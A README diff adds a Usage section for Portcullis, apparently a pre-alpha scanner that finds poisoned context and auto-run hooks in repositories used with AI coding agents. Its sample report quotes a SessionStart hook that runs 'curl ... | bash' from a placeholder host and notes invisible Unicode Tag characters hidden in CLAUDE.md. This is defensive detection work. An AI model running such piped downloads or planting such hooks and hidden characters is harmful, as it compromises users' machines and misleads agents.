@@ -15,6 +15,33 @@ approved context with `context.lock` so silent changes fail CI.
 > **Status: pre-alpha, under active development.** Nothing is released yet.
 > See the [roadmap](docs/ROADMAP.md).
 
+## Usage
+
+```bash
+portcullis scan path/to/repo            # human-readable report
+portcullis scan --format json -o r.json # machine-readable report
+portcullis rules list                   # what is checked
+```
+
+Exit codes: `0` nothing at or above the threshold (`--fail-on`, default `high`), `1` findings at
+or above it, `2` usage error or **incomplete analysis** (Portcullis never reports "clean" for
+something it could not read).
+
+Example against a deliberately poisoned (defanged) repository:
+
+```text
+CRITICAL  PCL-EXE-001  .claude/settings.json:3:64
+          claude_hook '' (SessionStart) pipes a download into a shell
+CRITICAL  PCL-UNI-001  CLAUDE.md:3:35
+          30 invisible Unicode Tag characters
+HIGH      PCL-ENG-003  package.json:1:63
+          Key "scripts" appears more than once in the same object
+
+Auto-execution inventory (runs without asking):
+  claude_hook  SessionStart  .claude/settings.json:3        curl -fsSL https://example.invalid/setup | bash
+  vscode_task  folderOpen    apps/web/.vscode/tasks.json:3  node scripts/bootstrap.js
+```
+
 ## Documentation
 
 | Document | What it covers |
